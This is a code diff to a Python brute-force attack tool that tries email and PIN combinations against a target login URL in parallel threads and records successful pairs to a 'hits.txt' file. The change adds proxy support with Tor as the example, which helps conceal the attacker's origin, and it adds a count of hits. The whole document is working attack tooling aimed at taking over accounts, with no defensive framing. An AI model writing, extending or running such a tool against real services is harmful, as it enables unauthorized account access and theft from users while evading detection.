@@ -9,9 +9,13 @@ import threading
 attempts = 0
 attempts_lock = threading.Lock()
 
-def attack(url, email, pin, delay, verbose, email_param="email", pin_param="pin"):
+def attack(url, email, pin, delay, verbose, email_param="email", pin_param="pin", proxies=None):
     global attempts
     session = requests.Session()
+
+    if proxies:
+        session.proxies.update(proxies)
+
     data = {email_param: email, pin_param: pin}
 
     try:
@@ -22,7 +26,6 @@ def attack(url, email, pin, delay, verbose, email_param="email", pin_param="pin"
             if verbose and attempts % 100 == 0:
                 print(f"[~] Attempts: {attempts} | Current: {email}:{pin}")
 
-        # On redirect, response.status_code == 302
         if "success" in response.headers.get("Location", "") or response.status_code == 302:
             print(f"[+] SUCCESS: {email}:{pin}")
             with open("hits.txt", "a") as f:
@@ -51,9 +54,9 @@ def main():
     parser.add_argument("--verbose", action="store_true", help="Enable status updates during brute force")
     parser.add_argument("--email-param", type=str, default="email", help="Parameter name for email")
     parser.add_argument("--pin-param", type=str, default="pin", help="Parameter name for PIN")
+    parser.add_argument("--proxy", type=str, help="Proxy URL (e.g., http://127.0.0.1:9050 for Tor)")
     
     args = parser.parse_args()
-
 
     print(f"[*] Target URL: {args.url}")
     print(f"[*] Using email: {args.email}")
@@ -63,6 +66,14 @@ def main():
     print(f"[*] Charset: {args.charset}")
     print(f"[*] Delay: {args.delay} seconds")
     print(f"[*] Verbose: {args.verbose}")
+    print(f"[*] Proxy: {args.proxy}")
+
+    proxies = None
+    if args.proxy:
+        proxies = {
+            "http": args.proxy,
+            "https": args.proxy
+        }
 
     if args.email:
         emails = [args.email]
@@ -76,12 +87,15 @@ def main():
         futures = []
         for email in emails:
             for pin in generate_pins(args.min_digits, args.max_digits, args.charset):
-                futures.append(executor.submit(attack, args.url, email, pin, args.delay, args.verbose, args.email_param, args.pin_param))
+                futures.append(executor.submit(
+                    attack, args.url, email, pin, args.delay, args.verbose,
+                    args.email_param, args.pin_param, proxies
+                ))
 
         for _ in as_completed(futures):
-            pass  # Keeps the thread pool from exiting early
+            pass
 
 if __name__ == '__main__':
     main()
-
-    print(f"[*] Total attempts: {attempts}") 
+    print(f"[*] Total attempts: {attempts}")
+    print(f"[*] Total hits: {len(open('hits.txt', 'r').readlines())}")
